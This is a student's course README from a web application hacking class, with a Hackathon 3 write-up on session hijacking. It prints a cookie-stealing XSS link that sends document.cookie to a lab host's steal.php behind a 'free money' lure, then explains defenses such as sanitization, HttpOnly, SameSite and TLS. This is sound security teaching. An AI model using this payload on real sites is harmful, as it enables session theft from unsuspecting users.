# waph

Public Respository for Web Application Programming and Hacking course - Dr. Phu Phung

# WAPH-Web Application Programming and Hacking

## Instructor: Dr. Phu Phung

## Student

**Name**: Nick Fishman

**Email**: [fishmane@mail.uc.edu](fishmane@mail.uc.edu)

**Short-bio**: Nick Fishman is an electrical engineering student with a specific interest in hardware and circuits. 

![Nick's headshot](headshot.jpg)

## Hackathon 3

### Part 1

#### Command:

\<a href="#" onclick="fetch('http://10.0.2.15:8080/steal.php?cookie='+document.cookie); return false;">Free $1000 from the US government! Click</a>

*NOTE* I had to disable Google Chrome's CORS Policies to make fetch() work. I wanted to have a different style than the others in my group, and most people vulnerable to being hacked in this manner use stuff like internet explorer anyways (which this may work on).

#### Video

https://youtu.be/cw5OG1o3QcQ

### Part 2

The fact that this hack worked with code this simple indicates several urgent vulnerabilities. The first is a lack of input sanitization, the second is that the infrastructure of the website lacks any sort of cookie security such as HttpOnly (which prevents scripts such as JavaScript from accessing cookies) or SameSite = Strict (which controls if cookies are sent between sites). Lastly, this website is unencrypted and should be encrypted with TLS.

## Repository Information

Respository's URL: [https://github.com/NickFishman04/waph.git](https://github.com/NickFishman04/waph.git)

This is a private repository for Nick Fishman to store all code from the course. The organization of this repository is as follows.

### Labs 

[Hands-on exercises in lectures](labs) 

  - [Lab 0](labs/lab0): Development Environment Setup 
  - [Lab 1](labs/lab1): Foundations of the Web
  - [Lab 2](labs/lab2): Front-end Web Development
  - [Lab 3](labs/lab3): Secure Web Application Development in PHP/MySQL

### Hackations

- [Hackathon 1](hackathons/hackathon1): Cross-site Scripting Attacks and Defenses 
- [Hackathon 2](hackathons/hackathon2): SQL Injection Attacks
- [Hackathon 3](hackathons/hackathon3): Session Hijacking Attacks and Defenses

### Individual Projects

- [Individual Project 1](projects/iproject1): Professional Profile Website and API Integration

### Team Project
